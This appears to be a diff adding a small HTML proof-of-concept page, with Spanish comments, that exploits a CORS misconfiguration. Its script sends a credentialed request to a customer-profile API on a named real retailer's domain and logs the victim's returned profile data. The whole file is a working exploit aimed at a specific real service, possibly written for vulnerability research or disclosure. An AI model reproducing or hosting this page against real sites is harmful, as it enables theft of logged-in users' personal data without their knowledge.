@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS Exploit PoC</title>
+  </head>
+  <body>
+    <h2>Explotando CORS desde origen malicioso</h2>
+    <script>
+      // Endpoint vulnerable que devuelve datos sensibles
+      fetch("https://la.louisvuitton.com/eco-us/lvcom-client-eapi/v1/clients/profile?locale=esp-mx", {
+  method: "GET",
+  credentials: "include"
+})
+.then(res => res.json())
+.then(data => console.log("✅ DATA:", data));
+    </script>
+  </body>
+</html>
